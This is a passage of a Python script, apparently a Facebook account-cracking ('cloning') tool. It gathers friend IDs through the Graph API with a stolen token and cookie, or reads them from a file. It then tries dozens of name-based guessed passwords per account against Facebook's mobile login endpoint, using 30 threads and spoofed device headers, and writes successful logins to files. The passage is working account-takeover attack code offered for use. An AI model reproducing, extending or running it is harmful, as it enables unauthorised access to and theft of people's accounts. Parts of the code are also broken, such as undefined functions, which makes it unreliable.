					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n   Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' CHOOSE RIGHT OPTION ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="yellow")
				nocp +=1
			input('[ Click Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' No OK FILE HERE ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' SELECT RIGHT OPTION ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('[ CLICK ENTER 2 BACK ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('SELECT RIGHT OPTION ')
		exit()

def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF IDZ: '))
	except ValueError:
		
		back()
	if jum<1 or jum>100000000:
		
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [] INPUT ID '+str(yz)+': ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('#TRY AGAIN ')
			os.system('clear')
	try:
		print(f' [] TOTAL ID: {P}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
		time.sleep(3)
		back()
		
def crack_file():
	os.system('clear')
	banner()
	os.system('espeak -a 300 " your file name sir "')
	print('\033[1;32m[ choose file name : /sdcard/king.txt ]')
	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN KING\n\x1b[1;97m [1] METHOD dark ')
	os.system('espeak -a 300 " 1,  method,  dark"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['9','09']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()

def passwrd():
	os.system('clear')
	banner()
	print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;92m USER NAME\033[1;91m :\033[1;96m "+NameX)
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
	HASANj(f'\033[0;97m===============================================')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append('57273200')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					pwv.append(frs+'1422')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'1234567')
					pwv.append(frs+'0111999999')
					pwv.append(frs+'bangladesh')
					pwv.append(frs+'BAngladesh')
					pwv.append(frs+'11')
					pwv.append(frs+'33')
					pwv.append(frs+'333')
					pwv.append(frs+'22')
					pwv.append(frs+'222')
					pwv.append(frs+'018')
					pwv.append(frs+'017')
					pwv.append(frs+'019')
					pwv.append(frs+'016')
					pwv.append(frs+'Nayeem')
					pwv.append(frs+'012')
					pwv.append(frs+'013')
					pwv.append(frs+'gaming')
					pwv.append(frs+'111')
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')					
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append('57273200')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					pwv.append(frs+'1422')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'1234567')
					pwv.append(frs+'0111999999')
					pwv.append(frs+'bangladesh')
					pwv.append(frs+'BAngladesh')
					pwv.append(frs+'11')
					pwv.append(frs+'33')
					pwv.append(frs+'333')
					pwv.append(frs+'22')
					pwv.append(frs+'222')
					pwv.append(frs+'018')
					pwv.append(frs+'017')
					pwv.append(frs+'019')
					pwv.append(frs+'016')
					pwv.append(frs+'Nayeem')
					pwv.append(frs+'012')
					pwv.append(frs+'013')
					pwv.append(frs+'gaming')
					pwv.append(frs+'111')
				pool.submit(crack,idf,pwv)
	print('')
	HASANj('==========================================')
	HASANj('CLONING COMPLETE .......... ')
	print(f'{h}[{h}💚{h}]{h} Your Total OK idz : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}[HASAN-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}>~<{P}[{h}OK{P}~{bo}{ok}{P}] "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ua="Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"
			ua="Dalvik/2.1.0 (Linux; U; Android 8.1; DM62 Build/PPR1.180610.011"
			ua="Dalvik/2.1.0 (Linux; U; Android 11; G7mini Build/RD2A.211001.002"
			ua="Dalvik/2.1.0 (Linux; U; Android 11; Projector Build/QP1A.191105.004"
			ua="Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 5 Build/TQ2A.230305.008.C1"
			ua="Dalvik/2.1.0 (Linux; U; Android 13; 21051182G Build/TKQ1.221114.001"
			info = {
			"adid": str(uuid.uuid4()),
			"format": "json",
			"device_id": str(uuid.uuid4()),
			"cpl": "true",
			"family_device_id": str(uuid.uuid4()),
			"credentials_type": "device_based_login_password",
			"error_detail_type": "button_with_disabled",
			"source": "device_based_login",
			"email": idf,
			"password": pw,
			"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
			"generate_session_cookies": "1",
			"meta_inf_fbmeta": "",
			"advertiser_id": str(uuid.uuid4()),
			"currently_logged_in_userid": "0",
			"locale": "en_GB",
			"client_country_code": "GB",
			"method": "auth.login",
			"fb_api_req_friendly_name": "authenticate",
			"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
			"api_key": "882a8490361da98702bf97a021ddc14d"}

			head = {
			'User-Agent': ua,
			'Content-Type': 'application/x-www-form-urlencoded',
			'Host': 'graph.facebook.com',
			'X-FB-Net-HNI': str(random.randint(20000, 40000)),
			'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
			'X-FB-Connection-Type': 'WIFI',
	    	'X-Tigon-Is-Retry': 'False',
			'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
			'X-fb-device-group': '5120',
			'X-FB-Friendly-Name': 'ViewerReactionsMutation',
			'X-FB-Request-Analytics-Tags': 'graphservice',
			'X-FB-HTTP-Engine': 'Liger',
			'X-FB-Client-IP': 'True',
			'X-FB-Server-Cluster': 'True',
			'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
			tumi= 'https://b-graph.facebook.com/auth/login'
			po = ses.post(url=tumi,data=info,headers=head).json()
			if "www.facebook.com" in po:
				prprint(f'\r\033[10;92m[{time.strftime("%H:%M")}•Adnan-Ok] {idf} • {pw} ')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "session_key" in po:
				ok+=1
				print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Adnan-Ok] {idf} • {pw} ')
				os.system('espeak -a 300 " dark-hack,  Ok,  id"')
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch prox.txt')
	except:pass


login()